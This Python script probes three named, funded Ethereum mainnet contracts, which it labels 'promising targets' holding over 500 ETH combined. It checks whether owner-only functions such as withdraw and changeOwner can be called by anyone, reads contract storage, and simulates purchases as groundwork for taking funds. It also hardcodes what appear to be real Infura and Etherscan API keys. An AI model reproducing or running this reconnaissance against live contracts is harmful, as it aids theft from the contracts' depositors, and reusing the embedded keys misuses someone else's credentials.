#!/usr/bin/env python3
"""
Deep analysis of promising targets:
1. RedemptionContract - division without protection
2. ArbitrageETHStaking - owner is zero address
"""
import json
import subprocess
import time

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data, from_addr="0x0000000000000000000000000000000000000001"):
    result = rpc_call("eth_call", [{"to": to, "data": data, "from": from_addr}, "latest"])
    return result

def estimate_gas(to, data, from_addr="0x0000000000000000000000000000000000000001", value="0x0"):
    result = rpc_call("eth_estimateGas", [{"to": to, "data": data, "from": from_addr, "value": value}])
    return result

def get_balance(addr):
    result = rpc_call("eth_getBalance", [addr, "latest"])
    if result and 'result' in result:
        return int(result['result'], 16) / 1e18
    return 0

def get_storage(addr, slot):
    result = rpc_call("eth_getStorageAt", [addr, slot, "latest"])
    if result and 'result' in result:
        return result['result']
    return None

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
    except:
        pass
    return None

print("=" * 80)
print("PROMISING TARGET ANALYSIS")
print("=" * 80)

# ============================================================================
# TARGET 1: ArbitrageETHStaking (216 ETH, owner=0x0)
# ============================================================================
print("\n" + "=" * 70)
print("[TARGET 1] ArbitrageETHStaking - 0x5eee354e36ac51e9d3f7283005cab0c55f423b23")
print("[HYPOTHESIS] Owner is zero - may allow anyone to call owner functions")
print("=" * 70)

addr1 = "0x5eee354e36ac51e9d3f7283005cab0c55f423b23"
balance1 = get_balance(addr1)
print(f"\nCurrent Balance: {balance1:.4f} ETH")

source1 = get_source(addr1)
if source1:
    src1 = source1.get("SourceCode", "")
    print(f"Source: {len(src1)} chars")
    print("\n--- FULL SOURCE CODE ---")
    print(src1[:5000])
    print("--- END SOURCE ---")

print("\n[Storage Analysis]")
for i in range(10):
    slot = get_storage(addr1, hex(i))
    if slot and slot != "0x" + "0"*64:
        print(f"  Slot {i}: {slot}")

print("\n[Function Tests]")
# Test onlyOwner functions
owner_funcs = {
    "withdraw()": "0x3ccfd60b",
    "withdrawAll()": "0x853828b6",
    "withdrawTo(address)": "0x0fdb1c10",
    "transfer(address,uint256)": "0xa9059cbb",
    "setPrice(uint256)": "0x91b7f5ed",
    "changeOwner(address)": "0xa6f9dae1",
}

for func, sel in owner_funcs.items():
    data = sel
    if "address" in func:
        data = sel + "0000000000000000000000000000000000000000000000000000000000000001"
    if "uint256" in func:
        if len(data) < 72:
            data = data + "0000000000000000000000000000000000000000000000000000000000000001"

    result = estimate_gas(addr1, data)
    if result:
        if 'result' in result:
            gas = int(result['result'], 16)
            print(f"  [+] {func} callable - gas: {gas}")
        elif 'error' in result:
            err = result['error'].get('message', '')[:60]
            print(f"  [-] {func}: {err}")

# ============================================================================
# TARGET 2: RedemptionContract (206 ETH)
# ============================================================================
print("\n\n" + "=" * 70)
print("[TARGET 2] RedemptionContract - 0x899f9a0440face1397a1ee1e3f6bf3580a6633d1")
print("[HYPOTHESIS] Division without empty check - possible manipulation")
print("=" * 70)

addr2 = "0x899f9a0440face1397a1ee1e3f6bf3580a6633d1"
balance2 = get_balance(addr2)
print(f"\nCurrent Balance: {balance2:.4f} ETH")

source2 = get_source(addr2)
if source2:
    src2 = source2.get("SourceCode", "")
    print(f"Source: {len(src2)} chars")
    print("\n--- FULL SOURCE CODE ---")
    print(src2)
    print("--- END SOURCE ---")

print("\n[Storage Analysis]")
for i in range(10):
    slot = get_storage(addr2, hex(i))
    if slot and slot != "0x" + "0"*64:
        print(f"  Slot {i}: {slot}")
        # Decode if looks like address
        if len(slot) == 66 and slot[2:26] == "0"*24:
            addr = "0x" + slot[26:]
            print(f"         -> address: {addr}")

print("\n[Function Tests]")
# Test redemption functions
redemption_funcs = {
    "redeem(uint256)": "0xdb006a75",
    "exchangeRate()": "0x3ba0b9a9",
    "token()": "0xfc0c546a",
    "owner()": "0x8da5cb5b",
    "withdraw()": "0x3ccfd60b",
}

for func, sel in redemption_funcs.items():
    data = sel
    if "uint256" in func:
        data = sel + "0000000000000000000000000000000000000000000000000000000000000001"

    result = eth_call(addr2, data)
    if result:
        if 'result' in result and result['result'] != '0x':
            val = result['result']
            try:
                decoded = int(val, 16)
                print(f"  {func}: {val} = {decoded}")
            except:
                print(f"  {func}: {val}")
        elif 'error' in result:
            err = result['error'].get('message', '')[:60]
            print(f"  {func}: ERROR - {err}")

# ============================================================================
# TARGET 3: Check Zethr2 more carefully (116 ETH)
# ============================================================================
print("\n\n" + "=" * 70)
print("[TARGET 3] Zethr2 - 0xb9ab8eed48852de901c13543042204c6c569b811")
print("[HYPOTHESIS] Ponzi/gambling contract - check for edge cases")
print("=" * 70)

addr3 = "0xb9ab8eed48852de901c13543042204c6c569b811"
balance3 = get_balance(addr3)
print(f"\nCurrent Balance: {balance3:.4f} ETH")

# Check key state
print("\n[On-Chain State]")
state_funcs = {
    "totalSupply()": "0x18160ddd",
    "totalEthereumBalance()": "0x3e0a322d",
    "stakingRequirement()": "0x6b2f4632",
    "ambassadorMaxPurchase()": "0x0e15561a",
    "onlyAmbassadors()": "0x3cebb823",
}

for func, sel in state_funcs.items():
    result = eth_call(addr3, sel)
    if result and result.get('result') and result['result'] != '0x':
        val = result['result']
        try:
            decoded = int(val, 16)
            if decoded > 1e15:  # Likely Wei
                print(f"  {func}: {decoded} ({decoded/1e18:.4f} ETH)")
            else:
                print(f"  {func}: {decoded}")
        except:
            print(f"  {func}: {val}")

# Try buy function
print("\n[Try Buy Function]")
buy_result = estimate_gas(addr3, "0xa6f2ae3a", value="0x8ac7230489e80000")  # 10 ETH
if buy_result:
    if 'result' in buy_result:
        print(f"  buy() with 10 ETH - gas: {int(buy_result['result'], 16)}")
    elif 'error' in buy_result:
        print(f"  buy(): {buy_result['error'].get('message', '')[:80]}")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
